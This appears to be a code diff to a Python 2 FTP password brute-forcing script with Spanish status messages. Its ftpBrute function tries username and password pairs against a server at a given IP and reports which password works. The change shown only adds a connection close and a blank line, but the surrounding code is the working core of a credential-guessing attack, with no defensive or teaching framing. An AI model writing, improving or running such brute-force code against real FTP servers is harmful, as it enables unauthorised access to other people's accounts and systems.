@@ -10,10 +10,12 @@ def ftpBrute(user, clave, ip):
         ftp = ftplib.FTP(ip)
         ftp.login(user, clave)
         print('[+] La clave de {0} es: {1}'.format(user, clave))
+        ftp.close()
         return 1
     except Exception, error:
         print('[-] Intentando con {0}'.format(clave))
         return 0
+
 
 def main():
     try:
